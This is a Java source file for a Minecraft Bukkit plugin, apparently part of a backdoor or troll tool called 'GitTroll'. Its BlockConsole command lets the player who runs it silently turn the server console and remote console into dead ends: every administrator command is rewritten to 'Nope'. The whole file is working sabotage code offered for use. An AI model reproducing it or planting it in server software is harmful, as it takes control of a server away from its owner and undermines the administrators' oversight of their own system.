package net.Lenni0451.GitTroll.command.commands.server;

import java.util.List;

import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.server.RemoteServerCommandEvent;
import org.bukkit.event.server.ServerCommandEvent;

import net.Lenni0451.GitTroll.command.CommandBase;
import net.Lenni0451.GitTroll.utils.ArrayHelper;
import net.Lenni0451.GitTroll.utils.CustomPlayer;

public class BlockConsole extends CommandBase implements Listener {

	private boolean consoleBlocked = false;
	
	public BlockConsole() {
		super("BlockConsole", "Block the server console");
	}

	@Override
	public void execute(CustomPlayer executor, ArrayHelper args) {
		if(args.isEmpty()) {
			this.consoleBlocked = !consoleBlocked;
			if(consoleBlocked) {
				executor.sendGitMessage("The console is now blocked.");
			} else {
				executor.sendGitMessage("§cThe console is no longer blocked.");
			}
		} else {
			this.commandWrong();
		}
	}

	@Override
	public void tabComplete(List<String> tabComplete, ArrayHelper args) {}

	@EventHandler
	public void onServerCommand(ServerCommandEvent event) {
		if(this.consoleBlocked)
			event.setCommand("Nope");
	}
	
	@EventHandler
	public void onRemoteServerCommand(RemoteServerCommandEvent event) {
		if(this.consoleBlocked)
			event.setCommand("Nope");
	}
	
}
